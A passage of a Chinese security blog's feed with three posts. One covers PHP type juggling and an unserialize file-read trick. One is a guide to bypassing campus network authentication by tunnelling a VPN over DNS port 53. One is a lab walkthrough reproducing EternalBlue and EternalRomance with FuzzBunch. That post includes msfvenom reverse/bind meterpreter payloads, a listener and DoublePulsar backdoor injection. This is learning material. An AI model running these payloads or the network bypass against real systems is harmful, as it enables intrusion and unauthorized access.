title="intval()"></a>intval()</h1><p>说明intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a = &apos;10000 union select * from yz&apos;;</span><br><span class="line">if(intval($a)&gt;1000)   </span><br><span class="line">    echo $a ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h1 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h1><p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$i =&quot;2abc&quot;;  </span><br><span class="line">switch ($i) &#123;  </span><br><span class="line">case 0:  </span><br><span class="line">case 1:  </span><br><span class="line">case 2:  </span><br><span class="line">echo &quot;i is less than 3 but not negative&quot;;  </span><br><span class="line">break;  </span><br><span class="line">case 3:  </span><br><span class="line">echo &quot;i is 3&quot;;  </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h1 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h1><p>下面的情况返回的都是true,因为’abc’会转换为0，’1bc’转换为1。<br>在所有php认为是int的地方输入string，都会被强制转换</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$array=[0,1,2,&apos;3&apos;];  </span><br><span class="line">var_dump(in_array(&apos;abc&apos;, $array)); //true  </span><br><span class="line">var_dump(in_array(&apos;1bc&apos;, $array)); //true</span><br></pre></td></tr></table></figure><h1 id="serialize-和-unserialize漏洞"><a href="#serialize-和-unserialize漏洞" class="headerlink" title="serialize 和 unserialize漏洞"></a>serialize 和 unserialize漏洞</h1><p>这里我们先简单介绍一下php中的魔术方法（这里如果对于类、对象、方法不熟的先去学学吧），即Magic方法，php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号<strong>开头的，比如 </strong>construct， <strong>destruct，</strong>toString，<strong>sleep，</strong>wakeup等等。这些函数都会在某些特殊时候被自动调用。<br>例如<strong>construct()方法会在一个对象被创建时自动调用，对应的</strong>destruct则会在一个对象被销毁时调用等等。<br>这里有两个比较特别的Magic方法，<strong>sleep 方法会在一个对象被序列化的时候调用。 </strong>wakeup方法会在一个对象被反序列化的时候调用。</p><p>在这里介绍一个序列化漏洞，首先不要相信用户输入的一切<br>看下面代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    public $username = &apos;&apos;;</span><br><span class="line">    public $password = &apos;&apos;;</span><br><span class="line">    public $file = &apos;&apos;;</span><br><span class="line">    public function out()&#123;</span><br><span class="line">        echo &quot;username: &quot;.$this-&gt;username.&quot;&lt;br&gt;&quot;.&quot;password: &quot;.$this-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     public function __toString() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">$a-&gt;file = &apos;C:\Users\YZ\Desktop\plan.txt&apos;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line">//tostring方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了</span><br></pre></td></tr></table></figure></p><p>下面就可以读取了C:\Users\YZ\Desktop\plan.txt文件了<br>echo unserialize触发了__tostring函数  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    public $username = &apos;&apos;;</span><br><span class="line">    public $password = &apos;&apos;;</span><br><span class="line">    public $file = &apos;&apos;;</span><br><span class="line">    public function out()&#123;</span><br><span class="line">        echo &quot;username: &quot;.$this-&gt;username.&quot;&lt;br&gt;&quot;.&quot;password: &quot;.$this-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     public function __toString() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = &apos;O:4:&quot;test&quot;:3:&#123;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:4:&quot;file&quot;;s:28:&quot;C:\Users\YZ\Desktop\plan.txt&quot;;&#125;&apos;;</span><br><span class="line">echo unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="session-反序列化漏洞"><a href="#session-反序列化漏洞" class="headerlink" title="session 反序列化漏洞"></a>session 反序列化漏洞</h1><p> 大佬的文章写得挺详细的: <a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p><p> 参考文章：  </p><p> <a href="https://blog.csdn.net/qq_31481187/article/details/60968595/" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/60968595/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="ctf" scheme="http://note.cfyqy.com/categories/ctf/"/>
    
      <category term="web" scheme="http://note.cfyqy.com/categories/ctf/web/"/>
    
    
      <category term="ctf" scheme="http://note.cfyqy.com/tags/ctf/"/>
    
      <category term="web" scheme="http://note.cfyqy.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>绕过校园网认证，实现校园防断网</title>
    <link href="http://note.cfyqy.com/posts/390158a6.html"/>
    <id>http://note.cfyqy.com/posts/390158a6.html</id>
    <published>2018-06-02T12:28:00.000Z</published>
    <updated>2018-09-18T09:32:44.229Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我的学校晚上十一点后就断网了，对于我这没有办理手机无限流量套餐的，看着可怜少之又少的流量套餐，断网后，就是一件悲催的事情，不能追剧，不能看动漫，不能刷漫画,很是无奈。最近，听说有位学弟实现了校园防断网，立马请教，学弟发了几片文章让我参考去实现，搞了一两天，感觉我真的手挺拙的，只能时不时地麻烦学弟,折腾了好几种防断网的方式，最后感觉搭建SoftEther实现防断网的方式比较稳。<br><a id="more"></a></p><h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>校园网的web认证，我们电脑连接这个wifi或者插上网线实现认证之前，电脑就已经被分配到了一个ip地址，当我们想要上网的时候，网关会修改我们的http数据包，让我们重定向到一个提示要打开网络认证或直接到网络认证的页面。如果没有认证成功，无法得知网关的arp信息，也就无法发送跨网段的tcp连接和http请求，当然无法上网。但是，开启web认证交换机设备默认是放行DHCP和DNS报文,也是就udp53和udp67。当然，这就是我们实现防断网要利用的重点。如果没有对udp53和udp67发送的任何数据包进行拦截，我们可以利用udp53和udp67发送任何形式的数据包，实现不用锐捷认证，就可以上网。<br>这里有篇web认证的详细说明<br><a href="http://www.ruijie.com.cn/fw/wt/36502" target="_blank" rel="noopener">http://www.ruijie.com.cn/fw/wt/36502</a></p><h1 id="环境检测"><a href="#环境检测" class="headerlink" title="环境检测"></a>环境检测</h1><p>电脑先连上wifi或者插上网线，不要认证。<br>打开cmd命令行，输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup wwww.baidu.com</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/vpn/1.png" alt=""><br>在没有认证校园网的情况下，可以查到ip地址，可以判定没有过滤dns报文<br>接下来，我们看一下没有放行udp53的所有数据包<br>先到该githb上下载一下测试工具  <a href="https://github.com/BennyThink/UDP53-Filter-Type" target="_blank" rel="noopener">https://github.com/BennyThink/UDP53-Filter-Type</a><br>linux用户 运行 <code>python UDP53.py</code><br>window下的用户运行dist下的UDP53.exe<br><img src="/posts/../../images/vpn/2.png" alt=""><br>出现 <code>Congratulations, you may wanna try OpenVPN!</code> 就知道dup53的任何数据包都被放行了。<br>现在我们可以继续下一步了。</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>准备一台vps<br>不建议买国内的云服务器来搭建，因为很多都是限制宽带的，搭建起来网速会很卡。<br>国外的vps比较好用的就vultr和搬瓦工的，vultr的性价比较高，个人建议买vultr的vps。<br>vutlr的官网：<a href="https://www.vultr.com/" target="_blank" rel="noopener">https://www.vultr.com/</a><br>softether的客户端和服务端相关软件可以在下面的链接下载，不过要翻墙。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.softether-download.com/cn.aspx?product=softether</span><br></pre></td></tr></table></figure></p><p>不能翻墙的，这里提供一个百度云盘地址下载<br>链接：<a href="https://pan.baidu.com/s/1OgpdL9Wg3naGNTUeQpDoAQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1OgpdL9Wg3naGNTUeQpDoAQ</a> 密码：ylgn</p><h1 id="softether-服务端的搭建"><a href="#softether-服务端的搭建" class="headerlink" title="softether 服务端的搭建"></a>softether 服务端的搭建</h1><p>vps的系统环境我选择linux系统ubuntu。<br> 32位：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://cfya.cfyqy.com/vpn_tool/softether-vpnserver-v4.27-9668-beta-2018.05.29-linux-x86-32bit.tar.gz</span><br></pre></td></tr></table></figure></p><p>64位：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://cfya.cfyqy.com/vpn_tool/softether-vpnserver-v4.27-9668-beta-2018.05.29-linux-x64-64bit.tar.gz</span><br></pre></td></tr></table></figure></p><p>根据自己的系统选择相应的位数</p><p>tar -zxvf 解压该压缩包<br><img src="/posts/../../images/vpn/3.png" alt=""></p><p>进入解压的vpnserver中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vpnserver</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p><p>然后输入3个连续的1<br><img src="/posts/../../images/vpn/4.png" alt=""><br>继续输入 开启服务<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./vpnserver start</span><br></pre></td></tr></table></figure></p><p>然后进行简单的配置<br>输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./vpncmd</span><br></pre></td></tr></table></figure></p><p>依次1，回车，回车<br>接下来输入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServerPasswordSet</span><br></pre></td></tr></table></figure></p><p>输入管理服务器的密码，两次确定之后，按 ctrl+C 退出管理。<br><img src="/posts/../../images/vpn/5.png" alt=""><br>设置开机自启动。<br>终端里依次输入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/rc.local</span><br></pre></td></tr></table></figure></p><p>在 exit 0 之前写入(start之前目录， 根据自己安装的位置填写)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/root/vpnserver/vpnserver start</span><br></pre></td></tr></table></figure></p><p>保存后退出  </p><h1 id="softether-服务端的管理"><a href="#softether-服务端的管理" class="headerlink" title="softether 服务端的管理"></a>softether 服务端的管理</h1><h2 id="管理服务端"><a href="#管理服务端" class="headerlink" title="管理服务端"></a>管理服务端</h2><p>在本地windows上<br>安装softether 服务端的管理软件<br><img src="/posts/../../images/vpn/6.png" alt=""><br>运行该软件后，新设置一个连接，填写相应的配置，填写vps的ip地址和之前设置的softetherr的服务端的密码<br><img src="/posts/../../images/vpn/7.png" alt=""><br>成功的连上vps的softether的服务端，开始相应的配置。<br><img src="/posts/../../images/vpn/14.png" alt=""></p><h2 id="新建hub"><a href="#新建hub" class="headerlink" title="新建hub"></a>新建hub</h2><p>默认已经建立了一个hub,可以使用默认的hub,我这里新建hub再建一个hub,随意的填写名字 和密码<br><img src="/posts/../../images/vpn/15.png" alt=""></p><h2 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h2><p>点击test,再点击管理用户，在新建的hub中新建一个用户，填写用户名(随意），密码自己设，连接的验证方式有挺多种的，这里就选择密码验证。<br><img src="/posts/../../images/vpn/12.png" alt=""></p><h2 id="启动SecureNAT"><a href="#启动SecureNAT" class="headerlink" title="启动SecureNAT"></a>启动SecureNAT</h2><p>配置 SecureNAT。在虚拟NAT和DHCP服务器中启动secureNAT,查看一下secureNAT的相应配置，保持默认就行，不要修改。<br><img src="/posts/../../images/vpn/8.png" alt=""></p><h2 id="勾选VPN-over-ICMP-DNS的配置"><a href="#勾选VPN-over-ICMP-DNS的配置" class="headerlink" title="勾选VPN over ICMP/DNS的配置"></a>勾选VPN over ICMP/DNS的配置</h2><p>然后到加密与网络中，点击VPN over ICMP/DNS，勾上那两个功能，校园防断网的实现就靠这个了。<br><img src="/posts/../../images/vpn/10.png" alt=""><br>在这里防断网的功能就已经实现了<br>接下来客户端的四种连接方式的没有必要一一尝试，只要懂得用softether client连接服务端，就可以实现防断网了。    </p><h1 id="客户端的连接"><a href="#客户端的连接" class="headerlink" title="客户端的连接"></a>客户端的连接</h1><p>客户端的连接，在服务端中我么就可以看到有三种连接方式：L2TP加密的连接、openVPN软件连接、VPN Azure连接。当然还有一种连接方式，直接用softether客户端连接。<br>当然个人实践中能实现防断网的只有softether客户端的连接方式。其他的客户端连接方式就当做vpn用吧<br><img src="/posts/../../images/vpn/9.png" alt=""></p><h2 id="softether-client"><a href="#softether-client" class="headerlink" title="softether client"></a>softether client</h2><p>要想实现校园无认证上网，用这种连接方式比较稳。当然该客户端只有电脑版的，没有手机的客户端，有点遗憾。不过你也可以电脑开热点给手机用，虽然麻烦点。<br>下载 softether client<br><img src="/posts/../../images/vpn/16.png" alt=""><br>新建一个vpn连接，如下图填写相应的配置<br><img src="/posts/../../images/vpn/17.png" alt=""><br>然后就可以直接连接了。</p><h2 id="L2TP加密协议连接"><a href="#L2TP加密协议连接" class="headerlink" title="L2TP加密协议连接"></a>L2TP加密协议连接</h2><p>首先softether 服务端要开启IPsec/L2TP中相应的选项，如下图<br><img src="/posts/../../images/vpn/18.png" alt=""><br>这种连接方式实现不了防断网，纯属连接一个vpn翻翻墙就ok啦。   </p><h3 id="手机端的连接"><a href="#手机端的连接" class="headerlink" title="手机端的连接"></a>手机端的连接</h3><p>手机现在都默认有一个vpn的连接功能，填写相应的配置就可以实现vpn连接。<br>打开手机的设置，找到vpn<br><img src="/posts/../../images/vpn/19.png" alt=""><br>添加一个新的连接，填写下图相应的配置，选择L2TP类型，输入服务端上的vps地址、IPsec预共享密钥、test的hub的账户<br><img src="/posts/../../images/vpn/20.png" alt=""></p><h3 id="window系统的连接"><a href="#window系统的连接" class="headerlink" title="window系统的连接"></a>window系统的连接</h3><p>找到<code>Win+R</code>调出运行菜单，输入<code>services.msc</code>，回车，弹出服务控制台。<br>找到<code>Routing and remote access</code>服务，双击打开编辑，设置该服务为自动运行，并启动它<br><img src="/posts/../../images/vpn/21.png" alt=""><br>到电脑的任务栏最右下方，找到vpn<br><img src="/posts/../../images/vpn/22.png" alt=""><br>添加新的vpn<br><img src="/posts/../../images/vpn/23.png" alt=""><br>根据下图进行相应的配置<br><img src="/posts/../../images/vpn/24.png" alt=""><br>然后在高级选择中打开，更改适配器选项，找到相应的适配器。右击属性，安全，允许使用这些协议，勾选相应的选项。<br><img src="/posts/../../images/vpn/25.png" alt=""><br>然后就能在<code>wifi</code>中找到vpn的连接，就可以连接成功啦<br><img src="/posts/../../images/vpn/26.png" alt=""> </p><h2 id="VPN-Azure连接"><a href="#VPN-Azure连接" class="headerlink" title="VPN Azure连接"></a>VPN Azure连接</h2><p><code>softether</code> 服务端,<code>VPN Azure</code>默认是禁用的， 先开启。<br><img src="/posts/../../images/vpn/27.png" alt=""><br>仔细看一下，发现<code>VPN Azure</code>真是骚，不用公网ip,只需要用<code>VPN Azure</code>云服务的主机名，就可以实现连接。</p><p>pc端的连接。找wifi中找到网络和internet设置，找到共享中心，建立新的连接或网络。<br><img src="/posts/../../images/vpn/28.png" alt=""></p><p>选择连接到工作区<br><img src="/posts/../../images/vpn/29.png" alt=""><br>选择否<br><img src="/posts/../../images/vpn/30.png" alt=""><br>使用我的网络连接<br><img src="/posts/../../images/vpn/31.png" alt=""><br>输入<code>VPN Azure</code>云服务的主机名。<br><img src="/posts/../../images/vpn/32.png" alt=""><br>在WiFi出找到该连接，进行连接<br><img src="/posts/../../images/vpn/33.png" alt=""></p><h2 id="openVPN连接"><a href="#openVPN连接" class="headerlink" title="openVPN连接"></a>openVPN连接</h2><p>openVPN这种连接方式不太建议，个人体验，感觉很差，经常连接不上去，网速又慢。<br>softether服务端的配置<br>监听的udp端口要选择53端口。看了网上的教程都说 这样可以实现防断网，不过我个人是没有成功过。然后生成样本配置文件。 确定。<br><img src="/posts/../../images/vpn/34.png" alt=""></p><p>pc端或手机端的配置<br>将生成的样本配置文件中的 文件名为<code>iznbnu828xckp1z_openvpn_remote_access_l3.ovpn</code>复制到openvpn的安装目录的’config’中<br><img src="/posts/../../images/vpn/35.png" alt=""><br>运行该软件，输入hub中用户名和密码开始连接<br><img src="/posts/../../images/vpn/36.png" alt=""><br>这一次又连接失败，当那个黄色的是绿色的时候，才是连接成功。</p><h1 id="pc端防断网测试"><a href="#pc端防断网测试" class="headerlink" title="pc端防断网测试"></a>pc端防断网测试</h1><p>现在我插上网线，没有用锐捷客户端认证，现在处于没有网络的状态。<br><img src="/posts/../../images/vpn/39.png" alt=""><br>可以softether客户端的连接，连接上了，仔细看右下方多了一个网络3的连接，说明我们已经连接上softether 服务端vpn了。现在，没有认证客户端，可以看到vpn适配器在发送数据包，所以说可以上网 。<br><img src="/posts/../../images/vpn/40.png" alt=""><br>我们游览YouTube，真的可以观看。<br><img src="/posts/../../images/vpn/41.png" alt=""></p><h1 id="网速测试"><a href="#网速测试" class="headerlink" title="网速测试"></a>网速测试</h1><p>vultr 日本节点的vps<br><img src="/posts/../../images/vpn/37.png" alt=""></p><p>阿里云服务器：<br><img src="/posts/../../images/vpn/38.png" alt=""></p><p>在这里我们可以看到连接到vultr的vps网速比连接到阿里云的网速快得超多的，所以，个人还是建议搭建在国外的vps,不但能防断网，还是翻墙。   </p><p>参考文章：<br><a href="https://www.bennythink.com/softether-vpnserver.html" target="_blank" rel="noopener">https://www.bennythink.com/softether-vpnserver.html</a><br><a href="https://www.bennythink.com/udp53.html" target="_blank" rel="noopener">https://www.bennythink.com/udp53.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我的学校晚上十一点后就断网了，对于我这没有办理手机无限流量套餐的，看着可怜少之又少的流量套餐，断网后，就是一件悲催的事情，不能追剧，不能看动漫，不能刷漫画,很是无奈。最近，听说有位学弟实现了校园防断网，立马请教，学弟发了几片文章让我参考去实现，搞了一两天，感觉我真的手挺拙的，只能时不时地麻烦学弟,折腾了好几种防断网的方式，最后感觉搭建SoftEther实现防断网的方式比较稳。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="杂谈" scheme="http://note.cfyqy.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="杂谈" scheme="http://note.cfyqy.com/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>永恒之蓝、永恒浪漫、永恒冠军复现</title>
    <link href="http://note.cfyqy.com/posts/caffa366.html"/>
    <id>http://note.cfyqy.com/posts/caffa366.html</id>
    <published>2018-06-01T10:54:00.000Z</published>
    <updated>2018-09-18T09:32:29.349Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自从Shadow Brokers（影子经纪人）泄露NSA(美国安全局)    的大量黑客工具，很多人就开始研究该黑客工具利用利用方式。其中比较出名的利用方式就是WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件就是利用了其中的永恒之蓝进行传播的。一直听着别人的利用方式，今天就去学习复现一下。<br><a id="more"></a></p><h1 id="Eternalblue（永恒之蓝）"><a href="#Eternalblue（永恒之蓝）" class="headerlink" title="Eternalblue（永恒之蓝）"></a>Eternalblue（永恒之蓝）</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><table><thead><tr><th>攻击机(window2003)</th><th>安装FuzzBunch等</th><th>ip 192.168.1.234</th></tr></thead><tbody><tr><td> 靶机(xp)</td><td>被攻击</td><td>ip 192.168.1.238</td></tr><tr><td>另一台攻击机(kail)</td><td>监听端口，靶机返回shell到此攻击机</td><td>ip 192.168.1.230</td></tr></tbody></table><h2 id="window2003相关环境的安装"><a href="#window2003相关环境的安装" class="headerlink" title="window2003相关环境的安装"></a>window2003相关环境的安装</h2><p>Python2.6：<a href="https://www.python.org/download/releases/2.6/（记得加到环境变量里）" target="_blank" rel="noopener">https://www.python.org/download/releases/2.6/（记得加到环境变量里）</a><br>PyWin32 v2.12（根据自己的攻击机系统选择合适的版本）    ：<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/</a><br>还有FuzzBunch <a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="noopener">https://github.com/misterch0c/shadowbroker</a><br>在fb.py中的72行记得注释掉要不会出错。<br><img src="/posts/../../images/yongheng/1.png" alt=""><br> FuzzBunch.xml中修改下图方框中的路径为你的攻击机上的安装目录相应文件的路径<br> <img src="/posts/../../images/yongheng/2.png" alt=""></p><h2 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h2><p> 运行fb.py<br> <img src="/posts/../../images/yongheng/3.png" alt=""><br> 设置目标地址为靶机(xp)地址，回调地址为本机地址<br>  <img src="/posts/../../images/yongheng/4.png" alt=""><br> 运行<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Eternalbule</span><br></pre></td></tr></table></figure></p><p> 当是否提示进行变量设置，选择yes。<br>  <img src="/posts/../../images/yongheng/5.png" alt=""><br>  攻击的系统（可以看到该模块可以攻击系统对象），此此测试环境是xp，所以就选择0 。传输方式选择1 ‘FB’.最后询问是否使用管道，就默认。<br>  <img src="/posts/../../images/yongheng/6.png" alt=""><br> 成功后显示<br> <img src="/posts/../../images/yongheng/7.png" alt=""><br> 失败了可以<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execute</span><br></pre></td></tr></table></figure></p><p> 多次尝试一下。失败了没关系，下面能成功就行。</p><h2 id="生成dll"><a href="#生成dll" class="headerlink" title="生成dll"></a>生成dll</h2><p> 在kail中<br> 因为是此环境中靶机xp是32位，所以就使用一下命令生成，然后复制到攻击机（window2003）中<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.234 LPORT=5555 -f dll &gt;reverse.dll</span><br></pre></td></tr></table></figure></p><p> 如果是靶机是64位，就<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.234 LPORT=5555 -f dll &gt;reverse.dll</span><br></pre></td></tr></table></figure></p><p> payload（载荷）中<br>bind：攻击者连接目标机器的模式，通常比较适合内网渗透，有时会被防火墙拦下<br>reverse：目标机连接攻击者的模式，基本上不会被防火墙阻拦。<br>附上两条bind<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.1.234 LPORT=5555 -f dll &gt;bind32.dll</span><br><span class="line"><span class="comment">#64位</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=192.168.1.234 LPORT=5555 -f dll &gt;bind64.dll</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"><span class="comment">## kail监听</span></span><br><span class="line">```bash</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span>  payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 5555</span><br><span class="line">lport =&gt; 5555</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:5555</span><br></pre></td></tr></table></figure></p><h2 id="使用DoublePulsar"><a href="#使用DoublePulsar" class="headerlink" title="使用DoublePulsar"></a>使用DoublePulsar</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use DoublePulsar</span><br></pre></td></tr></table></figure><p><img src="/posts/../../images/yongheng/8.png" alt=""><br>Architecture 选择 x32，Function 选 RunDLL，然后输入 DLL 路径<br><img src="/posts/../../images/yongheng/9.png" alt=""><br>成功的话<br>攻击机（window2003）<br> <img src="/posts/../../images/yongheng/11.png" alt=""><br> 攻击机（kail）<br> <img src="/posts/../../images/yongheng/10.png" alt=""> </p><h1 id="Eternalromance（永恒浪漫）"><a href="#Eternalromance（永恒浪漫）" class="headerlink" title="Eternalromance（永恒浪漫）"></a>Eternalromance（永恒浪漫）</h1><h2 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h2><table><thead><tr><th>攻击机(window2003)</th><th>安装shadowbroker等</th><th>ip 192.168.1.234</th></tr></thead><tbody><tr><td> 靶机(window2003)</td><td>被攻击</td><td>ip 192.168.1.135</td></tr><tr><td>另一台攻击机(kail)</td><td>监听端口，靶机返回shell到此攻击机</td><td>ip 192.168.1.230</td></tr></tbody></table><h2 id="Smbtouch判断可用漏洞"><a href="#Smbtouch判断可用漏洞" class="headerlink" title="Smbtouch判断可用漏洞"></a>Smbtouch判断可用漏洞</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Smbtouch </span><br><span class="line">execute</span><br></pre></td></tr></table></figure><p> <img src="/posts/../../images/yongheng/12.png" alt=""><br>显示可用的漏洞模块<br> <img src="/posts/../../images/yongheng/13.png" alt=""> </p><h2 id="Doublepulsar生成可用shellcode"><a href="#Doublepulsar生成可用shellcode" class="headerlink" title="Doublepulsar生成可用shellcode"></a>Doublepulsar生成可用shellcode</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Doublepulsar</span><br></pre></td></tr></table></figure><p>一路回车知道，注意选择 *0) OutputInstall ，此项功能可生成shellcode<br>文件名为shellcode.bin（可命名为任意文件）<br> <img src="/posts/../../images/yongheng/14.png" alt=""><br>在这里可以看到永恒浪漫可以攻击的系统对象，可以攻击的window系统还是挺多的。<br> <img src="/posts/../../images/yongheng/22.png" alt=""><br>一路回车，生成shellcode.bin<br><img src="/posts/../../images/yongheng/16.png" alt=""><br><img src="/posts/../../images/yongheng/17.png" alt=""></p><h2 id="EternalRomance植入Doublepulsar后门"><a href="#EternalRomance植入Doublepulsar后门" class="headerlink" title="EternalRomance植入Doublepulsar后门"></a>EternalRomance植入Doublepulsar后门</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use EternalRomance</span><br></pre></td></tr></table></figure><p>一路默认，Pipe[] 和Share[] 为可选项，直接回车跳过，Credentials选Anonymous<br><img src="/posts/../../images/yongheng/18.png" alt=""><br>输入先前生成的文件地址<br><img src="/posts/../../images/yongheng/15.png" alt=""><br>一路默认，执行成功<br><img src="/posts/../../images/yongheng/19.png" alt=""><br>已经成功的植入Doublepulsar后门了，可以利用Doublepulsar  </p><h2 id="生成dll-1"><a href="#生成dll-1" class="headerlink" title="生成dll"></a>生成dll</h2> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.234 LPORT=5555 -f dll &gt;reverse.dll</span><br></pre></td></tr></table></figure><p> 将生成的reverse.dll复制到攻击机(window2003)中</p><h2 id="kail监听"><a href="#kail监听" class="headerlink" title="kail监听"></a>kail监听</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span>  payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 5555</span><br><span class="line">lport =&gt; 5555</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:5555</span><br></pre></td></tr></table></figure><h2 id="Doublepulsar注入"><a href="#Doublepulsar注入" class="headerlink" title="Doublepulsar注入"></a>Doublepulsar注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Doublepulsar</span><br></pre></td></tr></table></figure><p>一路默认，注意在Function处选择 2)RunDLL，输入dll文件的位置<br><img src="/posts/../../images/yongheng/21.png" alt=""></p><p>然后回车到结束即可成功利用<br><img src="/posts/../../images/yongheng/20.png" alt=""></p><h1 id="Eternalchampion（永恒冠军）"><a href="#Eternalchampion（永恒冠军）" class="headerlink" title="Eternalchampion（永恒冠军）"></a>Eternalchampion（永恒冠军）</h1><h2 id="测试环境-2"><a href="#测试环境-2" class="headerlink" 